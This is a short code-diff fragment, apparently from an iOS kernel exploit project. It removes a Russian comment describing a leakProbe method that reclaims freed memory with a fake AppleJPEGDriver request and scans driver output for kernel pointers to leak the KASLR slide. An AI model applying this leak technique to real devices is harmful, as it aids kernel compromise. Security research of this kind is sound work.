@@ -1355,13 +1355,6 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
 }
 
 
-//
-//  leakProbe.m — добавляется в ViewController.m (v4)
-//  Метод: OOL fake-JpegRequest reclaim + sync-триггер + скан outStruct на kernel-указатели
-//  Цель: поймать живой KASLR slide (0xfffffff0......... в данных, вернувшихся из драйвера)
-//
-#import <mach/mach.h>
-
 - (void)leakProbe {
     [self log:@"=== leakProbe (v4): OOL reclaim + kernel-ptr scan ==="];
     io_service_t svc = [self findJPEGService];
